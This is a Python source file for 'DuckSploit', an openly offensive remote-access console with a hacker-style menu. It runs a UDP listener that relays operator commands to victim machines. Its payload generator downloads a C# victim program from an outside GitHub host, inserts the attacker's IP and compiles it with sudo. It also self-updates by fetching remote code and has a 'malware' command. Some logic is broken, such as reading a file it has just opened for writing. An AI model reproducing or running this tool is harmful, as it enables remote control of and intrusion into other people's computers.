from socket import *
from time import ctime
import os
from colorama import Fore
import requests
import atexit
import sys
import subprocess

pro = False


if os.path.exists("/usr/share/DuckSploit/pro.txt"):
    pro = True


HOST = '0.0.0.0'
PORT = 45357

BUFSIZE = 1024
ADDR = (HOST,PORT)


def update_system():
    script_path = os.path.abspath(sys.argv[0])
    #script_path = os.path.abspath(__file__)
    subprocess.run(['wget','https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/linux/server.py', '-o', script_path])




while True:
    os.system("clear")
    print(" ")
    print(Fore.GREEN + "        dP                   dP                         dP          oo   dP   ")
    print("        88                   88                         88               88   ")
    print("  .d888b88 dP    dP .d8888b. 88  .dP  .d8888b. 88d888b. 88 .d8888b. dP d8888P ")
    print("  88'  `88 88    88 88'  `\"\" 88888\"   Y8ooooo. 88'  `88 88 88'  `88 88   88   ")
    print("  88.  .88 88.  .88 88.  ... 88  `8b.       88 88.  .88 88 88.  .88 88   88   ")
    print("  `88888P8 `88888P' `88888P' dP   `YP `88888P' 88Y888P' dP `88888P' dP   dP   ")
    print("                                               88                              ")
    print("                                               dP                              ")
    print("                            | DuckSploit V1.1.4 |                         ")
    print(Fore.YELLOW+"                            build version: stable")
    if pro == True:
        print(Fore.RED+" > pro version")
    print(Fore.YELLOW + '    [' + Fore.RED + '0' + Fore.YELLOW + '] Exit')
    print(Fore.YELLOW + '    [' + Fore.RED + '1' + Fore.YELLOW + '] Wait')
    print(Fore.YELLOW + '    [' + Fore.RED + '2' + Fore.YELLOW + '] Credits')
    print(Fore.YELLOW + '    [' + Fore.RED + '3' + Fore.YELLOW + '] Generate payload')
    print(Fore.YELLOW + '    [' + Fore.RED + '4' + Fore.YELLOW + '] Visit our website')
    print(Fore.YELLOW + '    [' + Fore.RED + '5' + Fore.YELLOW + '] Update')
    if pro == True:
       print(Fore.YELLOW + '    [' + Fore.RED + '6' + Fore.YELLOW + '] ToolBox')
    if pro == True:
        menu = input(Fore.GREEN + "Choose option [" + Fore.YELLOW + "1" + Fore.RED + "," + Fore.YELLOW + "2" + Fore.RED + "," + Fore.YELLOW + "3" + Fore.RED + "," + Fore.YELLOW + "4" + Fore.RED + "," + Fore.YELLOW + "5" + Fore.RED + "," + Fore.YELLOW + "6" + Fore.RED + "," + Fore.YELLOW + "0" + Fore.GREEN + "]: ")
    else:
        menu = input(Fore.GREEN + "Choose option [" + Fore.YELLOW + "1" + Fore.RED + "," + Fore.YELLOW + "2" + Fore.RED + "," + Fore.YELLOW + "3" + Fore.RED + "," + Fore.YELLOW + "4" + Fore.RED + "," + Fore.YELLOW + "5" + Fore.RED + "," + Fore.YELLOW + "0" + Fore.GREEN + "]: ")

    if menu == "1":
        udpSerSock = socket(AF_INET,SOCK_DGRAM)
        udpSerSock.bind(ADDR)
        print(Fore.RED + "[" + Fore.RESET + "*" + Fore.RED + "] Waiting for connection..." + Fore.RESET)
        while True:
            data,ADDR = udpSerSock.recvfrom(BUFSIZE)
            #if data is None:
            #    break

                 #item1 = ":"
                  #item2 = ">> "
                   #list1 = [ADDR[0],item1,ADDR[1],item2,data]

            data = data.decode("utf-8")


            print(data[:-1])
                   # print(ADDR[0]":\033[1;32"ADDR[1] "\033[1;33>> " data)
            send_data = input(Fore.GREEN + "DS> " + Fore.RESET)
            if send_data is not None:
                bytes = str.encode(send_data)
                udpSerSock.sendto(bytes,(ADDR[0],ADDR[1])) 

            ### COMMANDS
            send_data = send_data.split()
            if len(send_data) != 0:
                if send_data[0] == "exit":
                        exit()
                elif send_data[0] == "clear" or send_data[0] == "cls":
                        os.system("clear")
                elif send_data[0] == "help":
                        url = requests.get("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/help.txt")
                        htmltext = url.text
                        print(Fore.GREEN + htmltext + Fore.RESET)
                        continue
                elif send_data[0] == "credits":
                        url = requests.get("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/credits.txt")
                        htmltext = url.text
                        print(Fore.GREEN + htmltext + Fore.RESET)
                elif send_data[0] == "malware":
                        try:
                            if send_data[1] == "--help":
                                url = requests.get("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/malwarehelp.txt")
                                htmltext = url.text
                                print(Fore.GREEN + htmltext + Fore.RESET)
                        except:
                            pass
        udpSerSock.close()
    elif menu == "2":
        os.system("clear")
        url = requests.get("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/credits.txt")
        print(url.text)
        input("press any key to continue...")
    elif menu == "3":
        os.system("clear")
        while True:
            print(Fore.GREEN + "DuckSploit payload generator")
            print("")
            print(Fore.YELLOW + '    [' + Fore.RED + '1' + Fore.YELLOW + '] Windows')
            print(Fore.YELLOW + '    [' + Fore.RED + '2' + Fore.YELLOW + '] Linux')
            print(Fore.YELLOW + '    [' + Fore.RED + '3' + Fore.YELLOW + '] Android')
            print(Fore.YELLOW + '    [' + Fore.RED + '4' + Fore.YELLOW + '] Exit')
            menu2 = input(Fore.GREEN + "Choose option [" + Fore.YELLOW + "1" + Fore.RED + "," + Fore.YELLOW + "2" + Fore.RED + "," + Fore.YELLOW + "3" + Fore.RED + "," + Fore.YELLOW + "4" + Fore.RED + Fore.GREEN + "]: ")
            if menu2 == "1":
                os.system("clear")
                print(Fore.YELLOW + "[o] mono is installed")
                print("")
                myip = input(Fore.GREEN + "Enter your ip (ipv4, ipv6 or dns server link allowed): ")
                os.system("sudo rm -rf /tmp/payload.cs && sudo curl https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs -o /tmp/payload.cs")
                file = open("/tmp/payload.cs", "w")
                file.write(file.read().replace("<yourip>", myip))
                os.system("sudo mcs /tmp/payload.cs")
            elif menu2 == "2":
                os.system("clear")
                print("soon...")
            elif menu2 == "3":
                os.system("clear")
                print("soon...")
            elif menu2 == "4":
                os.system("clear")
                break
            else:
                os.system("clear")
                print(Fore.RED + "[x] Bad awnser, only 1,2,3,4 accepted")
    elif menu == "4":
        os.system("python -mwebbrowser https://ducksploit.com")
    elif menu == "5":
        # update
        print(Fore.YELLOW+"Updating...")
        atexit.register(update_system)
        break
    elif menu == "6" and pro == True:
        os.system("python /usr/share/DuckSploit/dstoolbox.py")
    elif menu == "0":
        os.system("clear")
        print(Fore.RED + "[o] Exited from the console...")
        break
    else:
        os.system("clear")
        print(Fore.RED + "Invalid Option (only 1,2,3,4,5 or 99)..." + Fore.RESET)
